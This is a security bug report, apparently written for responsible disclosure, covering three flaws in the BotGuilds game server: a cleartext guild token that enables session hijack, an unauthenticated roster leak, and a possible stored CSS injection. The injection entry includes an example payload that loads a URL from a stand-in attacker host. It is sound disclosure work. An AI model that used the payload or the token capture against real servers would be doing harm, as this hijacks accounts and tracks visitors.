# BotGuilds server bugs

Suspected bugs, spec ambiguities, or surprising behaviours in the **BotGuilds
game server** (bot.willmorrison.net), to report to its developer. This is only
for the *game server* — not this bot, and not the reaper framework (reaper issues
go to /home/cal/reaper_bugs.md).

For each entry: what was observed, the frame/tick and conditions, what was
expected, and — where possible — a minimal reproduction. Keep it factual; the
game deliberately hides content, so "I don't know the recipe" is not a bug.

---

## SEC-1 (HIGH) — Guild token sent in CLEARTEXT over unencrypted TCP → session hijack

**Observed.** The game push API is a ZeroMQ DEALER→ROUTER socket over plain
`tcp://bot.willmorrison.net:5570` (per `guild_token.json` and docs 01/02/09). There
is no ZMQ CURVE encryption and no TLS. The `hello` handshake carries the guild's
long-lived bearer token as cleartext JSON: `{"type":"hello","guild_id":"g_…",
"token":"…"}` (docs/02-protocol.md line 36; steemer/client.py sends it via a plain
`json.dumps` with no crypto).

**Why it matters.** Any on-path observer (shared/hostile Wi-Fi, a compromised
router, an ISP/backbone tap, a malicious exit relay) can read the token off the
wire. Two documented behaviours turn a captured token into a full account takeover:
(a) "a new `hello` supersedes the guild's previous session" (client.py comment;
observed live as `kicked: another session hello'd as this guild — exiting`), and
(b) the token appears long-lived — it's minted once at guild creation and there's
no documented rotation/expiry. So one passive capture lets an attacker kick the
owner offline and issue actions as all of their characters, indefinitely.

**Expected.** Credentials should not traverse the network in the clear. Encrypt the
transport (ZMQ CURVE, or terminate TLS at a proxy / offer a `wss://` gateway),
and/or bind a token to a session/nonce so a replayed token can't silently seize an
active session.

**Repro.** Point tcpdump/wireshark at traffic to :5570 during a bot's `hello`; the
`token` field is visible in the first client frame. (Not exploiting — just noting
the field is cleartext.)

---

## SEC-2 (MEDIUM) — `/api/spectate/guilds` discloses EVERY guild's full roster + gear, unauthenticated

**Observed.** `GET /api/spectate/guilds` requires no auth (docs/reference_web:
"Spectate is display-only") yet returns, for **every** guild: name, guild color,
character count, per-world head-counts, and the **complete roster** — each
character's `char_uid`, `name`, `level`, `world`, `look`, and `equipment`
(captured live, e.g. `{"guild_id":"g_cd0e2a",…,"roster":[{"char_uid":…,"level":8,
"world":"spire","equipment":{"hand":"club"}}, …]}`).

**Why it matters.** In a competitive multiplayer game, one unauthenticated request
hands any party a full order-of-battle for all rivals — every character's level,
which world it's in, and its exact gear. That's strong scouting/targeting intel a
player normally shouldn't get for free. (It does NOT appear to include exact x/y or
HP, so it's not real-time coordinate tracking — the live `/events/spectate` frame
stream may expose more; worth reviewing that too.)

**Expected / question for the dev.** Confirm this exposure is intended. If spectating
is meant to be a lightweight display, consider coarsening it (counts/levels only,
not per-character gear), or gating detailed rosters behind auth.

---

## SEC-3 (MEDIUM, NEEDS DEV CONFIRMATION) — guild `color` may be a stored CSS-injection

**Observed.** A guild sets its map colour via `POST /api/guild/color` (cookie auth).
The public spectate web client renders that server-supplied value straight into a
DOM element's inline style — `swatch.style.background = guildColor(guild.guild_id)`
(reference_web/app.js ~line 657), in addition to canvas `fillStyle`/`strokeStyle`.
Canvas is safe (invalid colours are ignored), but assigning an unvalidated string to
`element.style.background` is a CSS sink.

**Why it matters.** IF the server does not strictly validate the colour is a real
CSS colour (hex/rgb/hsl/named), a guild could set it to e.g.
`url(https://attacker.example/pixel)` (or other CSS), and every visitor to the
spectate page would have their browser fetch that URL when the swatch renders —
CSS-based visitor tracking / data exfil / external-resource load, stored and served
to all spectators. Depending on the exact render path there may be room for worse.

**Expected.** Server-side allowlist the colour to a strict pattern
(`^#[0-9a-fA-F]{6}$` or a fixed palette) before storing it; the client should also
treat it as untrusted.

**To confirm (dev side).** Does `POST /api/guild/color` accept a non-colour string
like `url(...)`? (I did not send a malicious value to the live server.) If it stores
arbitrary strings, this is a live stored-injection reachable by anyone viewing the
map.

---

_Notes: SEC-1 is confirmed from the wire format/docs; SEC-2 is confirmed from
captured responses; SEC-3 depends on whether the server validates the colour (needs
Will to check). None were exploited — no malicious payloads were sent to the live
server. Analysis by the steemer bot's owner for responsible disclosure._
